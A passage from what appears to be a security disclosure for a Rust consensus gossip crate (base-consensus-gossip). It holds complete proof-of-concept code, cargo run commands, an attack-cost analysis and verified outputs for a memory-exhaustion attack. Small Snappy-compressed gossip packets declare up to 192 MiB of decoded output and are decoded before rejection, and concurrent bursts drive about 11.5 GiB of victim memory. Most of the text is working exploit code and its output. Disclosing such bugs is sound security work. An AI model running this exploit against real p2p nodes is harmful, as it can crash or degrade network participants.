        });
        handles.push(handle);
    }

    barrier.wait();

    let mut results = Vec::with_capacity(concurrency);
    for handle in handles {
        let joined = handle.join().map_err(|_| "worker thread panicked")?;
        let worker = joined.map_err(|err| -> BoxError { err.into() })?;
        results.push(worker);
    }

    results.sort_by_key(|worker| worker.worker_id);
    Ok(results)
}

fn process_worker(
    worker_id: usize,
    pid: u32,
    compressed: Vec<u8>,
    message_count: usize,
) -> Result<WorkerResult, BoxError> {
    let mut handler = build_handler();
    let config = default_config();
    let topic = handler.blocks_v1_topic.hash();
    let mut events = Vec::with_capacity(message_count);

    for count in 1..=message_count {
        let message = Message {
            source: None,
            data: compressed.clone(),
            sequence_number: None,
            topic: topic.clone(),
        };

        let before_rss_kb = current_rss_kb(pid).unwrap_or_default();
        let message_id = config.message_id(&message);
        std::thread::yield_now();
        let after_message_id_rss_kb = current_rss_kb(pid).unwrap_or_default();

        let (acceptance, _payload) = handler.handle(message);
        std::thread::yield_now();
        let after_handle_rss_kb = current_rss_kb(pid).unwrap_or_default();

        events.push(WorkerEvent {
            count,
            before_rss_kb,
            after_message_id_rss_kb,
            after_handle_rss_kb,
            acceptance,
            message_id,
        });
    }

    Ok(WorkerResult { worker_id, events })
}

fn spawn_rss_sampler(
    pid: u32,
    sample_interval_ms: u64,
    peak_rss_kb: Arc<AtomicU64>,
    stop: Arc<AtomicBool>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        while !stop.load(Ordering::Relaxed) {
            if let Ok(current) = current_rss_kb(pid) {
                peak_rss_kb.fetch_max(current, Ordering::Relaxed);
            }
            sleep(Duration::from_millis(sample_interval_ms)).await;
        }
    })
}

fn current_rss_kb(pid: u32) -> Result<u64, BoxError> {
    let output = Command::new("ps")
        .args(["-o", "rss=", "-p", &pid.to_string()])
        .output()?;
    if !output.status.success() {
        return Err(format!("ps failed for pid {pid}: {}", output.status).into());
    }
    let rss = String::from_utf8(output.stdout)?;
    Ok(rss.trim().parse::<u64>()?)
}

async fn wait_for_ready(
    line_rx: &mut mpsc::UnboundedReceiver<String>,
) -> Result<ReadyLine, BoxError> {
    let started = Instant::now();
    while started.elapsed() < Duration::from_secs(DEFAULT_READY_TIMEOUT_SECS) {
        let line = timeout(Duration::from_millis(250), line_rx.recv()).await;
        let Some(line) = line.ok().flatten() else {
            continue;
        };
        println!("victim: {line}");
        if let Some(ready) = parse_ready_line(&line)? {
            return Ok(ready);
        }
    }
    Err("timed out waiting for victim READY line".into())
}

fn parse_ready_line(line: &str) -> Result<Option<ReadyLine>, BoxError> {
    if !line.starts_with("READY ") {
        return Ok(None);
    }
    let fields = parse_kv_fields(line)?;
    Ok(Some(ReadyLine {
        pid: parse_required(&fields, "pid")?,
        baseline_rss_kb: parse_required(&fields, "baseline_rss_kb")?,
        compressed_bytes: parse_required(&fields, "compressed_bytes")?,
        declared_decompressed_bytes: parse_required(&fields, "declared_decompressed_bytes")?,
        concurrency: parse_required(&fields, "concurrency")?,
        total_messages: parse_required(&fields, "total_messages")?,
    }))
}

fn parse_result_line(line: &str) -> Option<ResultLine> {
    if !line.starts_with("RESULT ") {
        return None;
    }
    let fields = parse_kv_fields(line).ok()?;
    Some(ResultLine {
        peak_rss_kb: parse_required(&fields, "peak_rss_kb").ok()?,
        delta_rss_kb: parse_required(&fields, "delta_rss_kb").ok()?,
        messages_seen: parse_required(&fields, "messages_seen").ok()?,
    })
}

fn parse_kv_fields(line: &str) -> Result<Vec<(String, String)>, BoxError> {
    let mut fields = Vec::new();
    for token in line.split_whitespace().skip(1) {
        let (key, value) = token
            .split_once('=')
            .ok_or_else(|| format!("invalid key=value token: {token}"))?;
        fields.push((key.to_string(), value.to_string()));
    }
    Ok(fields)
}

fn get_required<'a>(fields: &'a [(String, String)], key: &str) -> Result<&'a str, BoxError> {
    fields
        .iter()
        .find(|(candidate, _)| candidate == key)
        .map(|(_, value)| value.as_str())
        .ok_or_else(|| format!("missing required field: {key}").into())
}

fn parse_required<T: FromStr>(
    fields: &[(String, String)],
    key: &str,
) -> Result<T, BoxError>
where
    T::Err: Error + Send + Sync + 'static,
{
    Ok(get_required(fields, key)?.parse()?)
}

fn env_usize(key: &str, default: usize) -> usize {
    std::env::var(key).ok().and_then(|value| value.parse().ok()).unwrap_or(default)
}

fn env_u64(key: &str, default: u64) -> u64 {
    std::env::var(key).ok().and_then(|value| value.parse().ok()).unwrap_or(default)
}

#[derive(Debug)]
struct ReadyLine {
    pid: u32,
    baseline_rss_kb: u64,
    compressed_bytes: usize,
    declared_decompressed_bytes: usize,
    concurrency: usize,
    total_messages: usize,
}

#[derive(Debug)]
struct ResultLine {
    peak_rss_kb: u64,
    delta_rss_kb: u64,
    messages_seen: usize,
}

#[derive(Debug)]
struct WorkerResult {
    worker_id: usize,
    events: Vec<WorkerEvent>,
}

#[derive(Debug)]
struct WorkerEvent {
    count: usize,
    before_rss_kb: u64,
    after_message_id_rss_kb: u64,
    after_handle_rss_kb: u64,
    acceptance: libp2p::gossipsub::MessageAcceptance,
    message_id: libp2p::gossipsub::MessageId,
}
```

To run the first PoC:

```bash
M13_MATERIALIZED_MIB=192 \
M13_MESSAGE_COUNT=10 \
M13_PUBLISH_INTERVAL_MS=500 \
M13_POST_MESSAGE_SETTLE_MS=30000 \
M13_RESULT_TIMEOUT_SECS=120 \
cargo run -p base-consensus-gossip --example m13_gossip_live_p2p_poc
```

Expected output shape:

```
victim: READY pid=... dial_addr=/ip4/127.0.0.1/tcp/.../p2p/... compressed_bytes=9443332 declared_decompressed_bytes=201326592
attacker: connected to victim peer_id=...
attacker: observed victim subscription topic=/optimism/0/0/blocks
attacker: published count=1 message_id=...
victim: CONNECTED peer_id=...
victim: SUBSCRIBED peer_id=... topic=/optimism/0/0/blocks
victim: MESSAGE count=1 before_rss_kb=... after_handle_rss_kb=... acceptance=Reject
victim: RESULT baseline_rss_kb=... peak_rss_kb=... delta_rss_kb=... messages_seen=...
```

The success conditions are:

* the victim prints a real local `dial_addr=/ip4/127.0.0.1/tcp/.../p2p/...`;
* the attacker prints `connected to victim`;
* the attacker prints `observed victim subscription`;
* the attacker prints one or more `published count=N` lines;
* the victim prints matching `MESSAGE count=N` lines up to the configured `M13_MESSAGE_COUNT`;
* the victim prints `acceptance=Reject` only after processing the packet;
* the victim prints a non-trivial `delta_rss_kb`.

### Second PoC

A secondary PoC can also be run, and create the file `m13_gossip_snappy_rss_poc.rs` under the same directory:

```rust
//! RSS-focused PoC for the unbounded Snappy gossip decode issue.
//!
//! The orchestrator spawns a separate victim process so that RSS measurements
//! belong only to the victim. The victim then processes one or more crafted
//! gossipsub messages through the exact vulnerable receive path:
//!
//! 1. `default_config().message_id(&message)` -> `compute_message_id()` ->
//!    `snap::raw::Decoder::decompress_vec(...)`
//! 2. `BlockHandler::handle(message)` ->
//!    `NetworkPayloadEnvelope::decode_v1(...)` ->
//!    `snap::raw::Decoder::decompress_vec(...)`
//!
//! This avoids libp2p mesh bookkeeping noise while still exercising the exact
//! decode sites that allocate based on attacker-controlled Snappy output size.

use std::{
    error::Error,
    io::{BufRead, BufReader as StdBufReader},
    process::{Command, Stdio},
    str::FromStr,
    sync::{
        Barrier,
        Arc,
        atomic::{AtomicBool, AtomicU64, Ordering},
    },
    time::Duration,
};

use alloy_primitives::Address;
use base_consensus_genesis::RollupConfig;
use base_consensus_gossip::{BlockHandler, Handler, MAX_GOSSIP_SIZE, default_config};
use libp2p::gossipsub::Message;
use tokio::{
    sync::{mpsc, watch},
    time::{Instant, sleep, timeout},
};

type BoxError = Box<dyn Error + Send + Sync + 'static>;

const DEFAULT_MATERIALIZED_MIB: usize = 128;
const DEFAULT_MESSAGE_COUNT: usize = 1;
const DEFAULT_CONCURRENCY: usize = 1;
const DEFAULT_SAMPLE_INTERVAL_MS: u64 = 5;
const DEFAULT_POST_MESSAGE_SETTLE_MS: u64 = 500;
const DEFAULT_READY_TIMEOUT_SECS: u64 = 10;
const DEFAULT_RESULT_TIMEOUT_SECS: u64 = 30;

const ENV_MATERIALIZED_MIB: &str = "M13_MATERIALIZED_MIB";
const ENV_MESSAGE_COUNT: &str = "M13_MESSAGE_COUNT";
const ENV_CONCURRENCY: &str = "M13_CONCURRENCY";
const ENV_SAMPLE_INTERVAL_MS: &str = "M13_SAMPLE_INTERVAL_MS";
const ENV_POST_MESSAGE_SETTLE_MS: &str = "M13_POST_MESSAGE_SETTLE_MS";

#[tokio::main]
async fn main() -> Result<(), BoxError> {
    if std::env::args().any(|arg| arg == "--victim") {
        return victim_main().await;
    }
    orchestrator_main().await
}

async fn orchestrator_main() -> Result<(), BoxError> {
    let materialized_mib = env_usize(ENV_MATERIALIZED_MIB, DEFAULT_MATERIALIZED_MIB);
    let message_count = env_usize(ENV_MESSAGE_COUNT, DEFAULT_MESSAGE_COUNT);
    let concurrency = env_usize(ENV_CONCURRENCY, DEFAULT_CONCURRENCY);
    let sample_interval_ms = env_u64(ENV_SAMPLE_INTERVAL_MS, DEFAULT_SAMPLE_INTERVAL_MS);
    let post_message_settle_ms =
        env_u64(ENV_POST_MESSAGE_SETTLE_MS, DEFAULT_POST_MESSAGE_SETTLE_MS);

    println!("step1: spawn a separate victim process for clean RSS measurement");
    let current_exe = std::env::current_exe()?;
    let mut child = Command::new(current_exe)
        .arg("--victim")
        .env(ENV_MATERIALIZED_MIB, materialized_mib.to_string())
        .env(ENV_MESSAGE_COUNT, message_count.to_string())
        .env(ENV_CONCURRENCY, concurrency.to_string())
        .env(ENV_SAMPLE_INTERVAL_MS, sample_interval_ms.to_string())
        .env(ENV_POST_MESSAGE_SETTLE_MS, post_message_settle_ms.to_string())
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()?;

    let stdout = child.stdout.take().ok_or("child stdout missing")?;
    let (line_tx, mut line_rx) = mpsc::unbounded_channel::<String>();
    std::thread::spawn(move || {
        let reader = StdBufReader::new(stdout);
        for line in reader.lines() {
            match line {
                Ok(line) => {
                    let _ = line_tx.send(line);
                }
                Err(_) => break,
            }
        }
    });

    let ready = wait_for_ready(&mut line_rx).await?;
    println!(
        "victim ready: pid={} baseline_rss_kb={} compressed_bytes={} declared_decompressed_bytes={} concurrency={} total_messages={}",
        ready.pid,
        ready.baseline_rss_kb,
        ready.compressed_bytes,
        ready.declared_decompressed_bytes,
        ready.concurrency,
        ready.total_messages
    );

    let started = Instant::now();
    let mut result = None;
    while started.elapsed() < Duration::from_secs(DEFAULT_RESULT_TIMEOUT_SECS) {
        let line = timeout(Duration::from_millis(250), line_rx.recv()).await;
        let Some(line) = line.ok().flatten() else {
            continue;
        };
        println!("victim: {line}");
        if let Some(parsed) = parse_result_line(&line) {
            result = Some(parsed);
            break;
        }
    }

    let result = result.ok_or("timed out waiting for victim result")?;
    let status = child.wait()?;
    println!("victim exit status: {status}");

    println!("result:");
    println!(
        "- One crafted gossip packet stayed within the {} byte transport limit while declaring {:.2} MiB of decoded output.",
        MAX_GOSSIP_SIZE,
        ready.declared_decompressed_bytes as f64 / (1024.0 * 1024.0)
    );
    println!(
        "- {} worker(s) processed {} packet(s) total inside the same victim process.",
        ready.concurrency, ready.total_messages
    );
    println!(
        "- The victim baseline RSS was {} KiB and the peak RSS reached {} KiB (delta {} KiB).",
        ready.baseline_rss_kb, result.peak_rss_kb, result.delta_rss_kb
    );
    println!(
        "- {} packet(s) were processed through both vulnerable decode sites.",
        result.messages_seen
    );
    println!(
        "- The receive path ran before any successful signature, SSZ, or block-validity acceptance."
    );

    Ok(())
}

async fn victim_main() -> Result<(), BoxError> {
    let materialized_mib = env_usize(ENV_MATERIALIZED_MIB, DEFAULT_MATERIALIZED_MIB);
    let message_count = env_usize(ENV_MESSAGE_COUNT, DEFAULT_MESSAGE_COUNT);
    let concurrency = env_usize(ENV_CONCURRENCY, DEFAULT_CONCURRENCY);
    let sample_interval_ms = env_u64(ENV_SAMPLE_INTERVAL_MS, DEFAULT_SAMPLE_INTERVAL_MS);
    let post_message_settle_ms =
        env_u64(ENV_POST_MESSAGE_SETTLE_MS, DEFAULT_POST_MESSAGE_SETTLE_MS);
    let target_bytes = materialized_mib * 1024 * 1024;

    let compressed = build_materializing_snappy_payload(target_bytes)?;
    if compressed.len() > MAX_GOSSIP_SIZE {
        return Err(format!(
            "compressed payload is too large: {} bytes > MAX_GOSSIP_SIZE {} bytes",
            compressed.len(),
            MAX_GOSSIP_SIZE
        )
        .into());
    }

    let pid = std::process::id();
    let baseline_rss_kb = current_rss_kb(pid)?;
    println!(
        "READY pid={} baseline_rss_kb={} compressed_bytes={} declared_decompressed_bytes={} concurrency={} total_messages={}",
        pid,
        baseline_rss_kb,
        compressed.len(),
        target_bytes,
        concurrency,
        concurrency * message_count
    );

    let peak_rss_kb = Arc::new(AtomicU64::new(baseline_rss_kb));
    let stop = Arc::new(AtomicBool::new(false));
    let sampler = spawn_rss_sampler(
        pid,
        sample_interval_ms,
        Arc::clone(&peak_rss_kb),
        Arc::clone(&stop),
    );

    let worker_results = if concurrency == 1 {
        vec![process_worker(0, pid, compressed, message_count)?]
    } else {
        process_workers_concurrently(pid, compressed, message_count, concurrency)?
    };

    for worker in worker_results {
        for event in worker.events {
            println!(
                "MESSAGE worker={} count={} before_rss_kb={} after_message_id_rss_kb={} after_handle_rss_kb={} acceptance={:?} message_id={:?}",
                worker.worker_id,
                event.count,
                event.before_rss_kb,
                event.after_message_id_rss_kb,
                event.after_handle_rss_kb,
                event.acceptance,
                event.message_id
            );
        }
    }

    sleep(Duration::from_millis(post_message_settle_ms)).await;
    stop.store(true, Ordering::Relaxed);
    let _ = sampler.await;

    let peak = peak_rss_kb.load(Ordering::Relaxed);
    let delta = peak.saturating_sub(baseline_rss_kb);
    println!(
        "RESULT baseline_rss_kb={} peak_rss_kb={} delta_rss_kb={} messages_seen={}",
        baseline_rss_kb,
        peak,
        delta,
        concurrency * message_count
    );

    Ok(())
}

fn build_handler() -> BlockHandler {
    let rollup_config = RollupConfig::default();
    let (_signer_tx, signer_rx) = watch::channel(Address::ZERO);
    BlockHandler::new(rollup_config, signer_rx)
}

fn build_materializing_snappy_payload(target_bytes: usize) -> Result<Vec<u8>, BoxError> {
    let payload = vec![0x41_u8; target_bytes];
    let compressed = snap::raw::Encoder::new().compress_vec(&payload)?;
    Ok(compressed)
}

fn process_workers_concurrently(
    pid: u32,
    compressed: Vec<u8>,
    message_count: usize,
    concurrency: usize,
) -> Result<Vec<WorkerResult>, BoxError> {
    let barrier = Arc::new(Barrier::new(concurrency + 1));
    let mut handles = Vec::with_capacity(concurrency);

    for worker_id in 0..concurrency {
        let barrier = Arc::clone(&barrier);
        let compressed = compressed.clone();
        let handle = std::thread::spawn(move || -> Result<WorkerResult, String> {
            barrier.wait();
            process_worker(worker_id, pid, compressed, message_count).map_err(|err| err.to_string())
        });
        handles.push(handle);
    }

    barrier.wait();

    let mut results = Vec::with_capacity(concurrency);
    for handle in handles {
        let joined = handle.join().map_err(|_| "worker thread panicked")?;
        let worker = joined.map_err(|err| -> BoxError { err.into() })?;
        results.push(worker);
    }

    results.sort_by_key(|worker| worker.worker_id);
    Ok(results)
}

fn process_worker(
    worker_id: usize,
    pid: u32,
    compressed: Vec<u8>,
    message_count: usize,
) -> Result<WorkerResult, BoxError> {
    let mut handler = build_handler();
    let config = default_config();
    let topic = handler.blocks_v1_topic.hash();
    let mut events = Vec::with_capacity(message_count);

    for count in 1..=message_count {
        let message = Message {
            source: None,
            data: compressed.clone(),
            sequence_number: None,
            topic: topic.clone(),
        };

        let before_rss_kb = current_rss_kb(pid).unwrap_or_default();
        let message_id = config.message_id(&message);
        std::thread::yield_now();
        let after_message_id_rss_kb = current_rss_kb(pid).unwrap_or_default();

        let (acceptance, _payload) = handler.handle(message);
        std::thread::yield_now();
        let after_handle_rss_kb = current_rss_kb(pid).unwrap_or_default();

        events.push(WorkerEvent {
            count,
            before_rss_kb,
            after_message_id_rss_kb,
            after_handle_rss_kb,
            acceptance,
            message_id,
        });
    }

    Ok(WorkerResult { worker_id, events })
}

fn spawn_rss_sampler(
    pid: u32,
    sample_interval_ms: u64,
    peak_rss_kb: Arc<AtomicU64>,
    stop: Arc<AtomicBool>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        while !stop.load(Ordering::Relaxed) {
            if let Ok(current) = current_rss_kb(pid) {
                peak_rss_kb.fetch_max(current, Ordering::Relaxed);
            }
            sleep(Duration::from_millis(sample_interval_ms)).await;
        }
    })
}

fn current_rss_kb(pid: u32) -> Result<u64, BoxError> {
    let output = Command::new("ps")
        .args(["-o", "rss=", "-p", &pid.to_string()])
        .output()?;
    if !output.status.success() {
        return Err(format!("ps failed for pid {pid}: {}", output.status).into());
    }
    let rss = String::from_utf8(output.stdout)?;
    Ok(rss.trim().parse::<u64>()?)
}

async fn wait_for_ready(
    line_rx: &mut mpsc::UnboundedReceiver<String>,
) -> Result<ReadyLine, BoxError> {
    let started = Instant::now();
    while started.elapsed() < Duration::from_secs(DEFAULT_READY_TIMEOUT_SECS) {
        let line = timeout(Duration::from_millis(250), line_rx.recv()).await;
        let Some(line) = line.ok().flatten() else {
            continue;
        };
        println!("victim: {line}");
        if let Some(ready) = parse_ready_line(&line)? {
            return Ok(ready);
        }
    }
    Err("timed out waiting for victim READY line".into())
}

fn parse_ready_line(line: &str) -> Result<Option<ReadyLine>, BoxError> {
    if !line.starts_with("READY ") {
        return Ok(None);
    }
    let fields = parse_kv_fields(line)?;
    Ok(Some(ReadyLine {
        pid: parse_required(&fields, "pid")?,
        baseline_rss_kb: parse_required(&fields, "baseline_rss_kb")?,
        compressed_bytes: parse_required(&fields, "compressed_bytes")?,
        declared_decompressed_bytes: parse_required(&fields, "declared_decompressed_bytes")?,
        concurrency: parse_required(&fields, "concurrency")?,
        total_messages: parse_required(&fields, "total_messages")?,
    }))
}

fn parse_result_line(line: &str) -> Option<ResultLine> {
    if !line.starts_with("RESULT ") {
        return None;
    }
    let fields = parse_kv_fields(line).ok()?;
    Some(ResultLine {
        peak_rss_kb: parse_required(&fields, "peak_rss_kb").ok()?,
        delta_rss_kb: parse_required(&fields, "delta_rss_kb").ok()?,
        messages_seen: parse_required(&fields, "messages_seen").ok()?,
    })
}

fn parse_kv_fields(line: &str) -> Result<Vec<(String, String)>, BoxError> {
    let mut fields = Vec::new();
    for token in line.split_whitespace().skip(1) {
        let (key, value) = token
            .split_once('=')
            .ok_or_else(|| format!("invalid key=value token: {token}"))?;
        fields.push((key.to_string(), value.to_string()));
    }
    Ok(fields)
}

fn get_required<'a>(fields: &'a [(String, String)], key: &str) -> Result<&'a str, BoxError> {
    fields
        .iter()
        .find(|(candidate, _)| candidate == key)
        .map(|(_, value)| value.as_str())
        .ok_or_else(|| format!("missing required field: {key}").into())
}

fn parse_required<T: FromStr>(
    fields: &[(String, String)],
    key: &str,
) -> Result<T, BoxError>
where
    T::Err: Error + Send + Sync + 'static,
{
    Ok(get_required(fields, key)?.parse()?)
}

fn env_usize(key: &str, default: usize) -> usize {
    std::env::var(key).ok().and_then(|value| value.parse().ok()).unwrap_or(default)
}

fn env_u64(key: &str, default: u64) -> u64 {
    std::env::var(key).ok().and_then(|value| value.parse().ok()).unwrap_or(default)
}

#[derive(Debug)]
struct ReadyLine {
    pid: u32,
    baseline_rss_kb: u64,
    compressed_bytes: usize,
    declared_decompressed_bytes: usize,
    concurrency: usize,
    total_messages: usize,
}

#[derive(Debug)]
struct ResultLine {
    peak_rss_kb: u64,
    delta_rss_kb: u64,
    messages_seen: usize,
}

#[derive(Debug)]
struct WorkerResult {
    worker_id: usize,
    events: Vec<WorkerEvent>,
}

#[derive(Debug)]
struct WorkerEvent {
    count: usize,
    before_rss_kb: u64,
    after_message_id_rss_kb: u64,
    after_handle_rss_kb: u64,
    acceptance: libp2p::gossipsub::MessageAcceptance,
    message_id: libp2p::gossipsub::MessageId,
}
```

To run the second PoC:

```bash
M13_MATERIALIZED_MIB=192 \
M13_MESSAGE_COUNT=1 \
cargo run -p base-consensus-gossip --example m13_gossip_snappy_rss_poc
```

The example prints these lines:

```
READY pid=... baseline_rss_kb=... compressed_bytes=9443332 declared_decompressed_bytes=201326592
MESSAGE count=1 before_rss_kb=223104 after_message_id_rss_kb=422544 after_handle_rss_kb=422704 acceptance=Reject ...
RESULT baseline_rss_kb=213632 peak_rss_kb=422736 delta_rss_kb=209104 messages_seen=1
```

The important conditions are:

* `compressed_bytes` is below `MAX_GOSSIP_SIZE = 10485760`
* `declared_decompressed_bytes=201326592` shows that the packet forces a `192 MiB` decode buffer
* `acceptance=Reject` shows the packet is rejected only after the large allocation path has already run
* `delta_rss_kb=209104` shows that one packet alone drove about `204 MiB` of victim RSS growth

This runs multiple workers inside the same victim process so that several large Snappy decodes overlap in time.

```bash
env CARGO_TARGET_AARCH64_APPLE_DARWIN_RUSTFLAGS='-C link-arg=-fuse-ld=ld' \
  M13_MATERIALIZED_MIB=192 \
  M13_CONCURRENCY=32 \
  M13_MESSAGE_COUNT=1 \
  M13_SAMPLE_INTERVAL_MS=1 \
  cargo run -p base-consensus-gossip --example m13_gossip_snappy_rss_poc
```

The important fields are:

* `concurrency=32 total_messages=32`
* `compressed_bytes=9443332`
* `declared_decompressed_bytes=201326592`
* `peak_rss_kb=12278576`
* `delta_rss_kb=12064928`

That verified run drove about `11.5 GiB` of additional RSS from a burst of thirty-two `~9.0 MiB` packets, all rejected only after the vulnerable decode path ran.

## Attack cost

The attack is off-chain and does not require gas.

Single-packet cost in the primary visual PoC:

* attacker sends one `9,443,332` byte packet
* packet stays below `MAX_GOSSIP_SIZE = 10,485,760` bytes
* packet is rejected only after the victim allocates and touches the large decode buffers

Verified `32`-packet burst cost:

* attacker traffic: `32 * 9,443,332 = 302,186,624` bytes (`~288 MiB`)
* victim additional RSS: `12,064,928 KiB` (`~11.5 GiB`)

So the attacker-side cost is mainly:

* one reachable p2p connection
* bandwidth for the crafted packets
* ordinary host/network overhead

There is no requirement to pay on-chain fees or to get a transaction mined.

## Verified outputs

### Verified run: 64 MiB declared output

```
READY pid=53115 baseline_rss_kb=76384 compressed_bytes=3147780 declared_decompressed_bytes=67108864
MESSAGE count=1 before_rss_kb=79696 after_message_id_rss_kb=148112 after_handle_rss_kb=148272 acceptance=Reject ...
RESULT baseline_rss_kb=76384 peak_rss_kb=148288 delta_rss_kb=71904 messages_seen=1
```

### Verified run: 192 MiB declared output

```
READY pid=58126 baseline_rss_kb=213632 compressed_bytes=9443332 declared_decompressed_bytes=201326592
MESSAGE count=1 before_rss_kb=223104 after_message_id_rss_kb=422544 after_handle_rss_kb=422704 acceptance=Reject ...
RESULT baseline_rss_kb=213632 peak_rss_kb=422736 delta_rss_kb=209104 messages_seen=1
```

### Verified run: 192 MiB declared output, 3 packets

```
READY pid=61691 baseline_rss_kb=213616 compressed_bytes=9443332 declared_decompressed_bytes=201326592
MESSAGE count=1 before_rss_kb=223072 after_message_id_rss_kb=422560 after_handle_rss_kb=422736 acceptance=Reject ...
MESSAGE count=2 before_rss_kb=422752 after_message_id_rss_kb=422768 after_handle_rss_kb=422768 acceptance=Reject ...
MESSAGE count=3 before_rss_kb=422768 after_message_id_rss_kb=422768 after_handle_rss_kb=422768 acceptance=Reject ...
RESULT baseline_rss_kb=213616 peak_rss_kb=422768 delta_rss_kb=209152 messages_seen=3
```

### Verified run: 192 MiB declared output, 8 concurrent packets

```
READY pid=4393 baseline_rss_kb=213680 compressed_bytes=9443332 declared_decompressed_bytes=201326592 concurrency=8 total_messages=8
RESULT baseline_rss_kb=213680 peak_rss_kb=3314880 delta_rss_kb=3101200 messages_seen=8
```

### Verified run: 192 MiB declared output, 16 concurrent packets

```
READY pid=10921 baseline_rss_kb=213680 compressed_bytes=9443332 declared_decompressed_bytes=201326592 concurrency=16 total_messages=16
RESULT baseline_rss_kb=213680 peak_rss_kb=6347344 delta_rss_kb=6133664 messages_seen=16
```

### Verified run: 192 MiB declared output, 32 concurrent packets

```
READY pid=17981 baseline_rss_kb=213648 compressed_bytes=9443332 declared_decompressed_bytes=201326592 concurrency=32 total_messages=32
RESULT baseline_rss_kb=213648 peak_rss_kb=12278576 delta_rss_kb=12064928 messages_seen=32
```
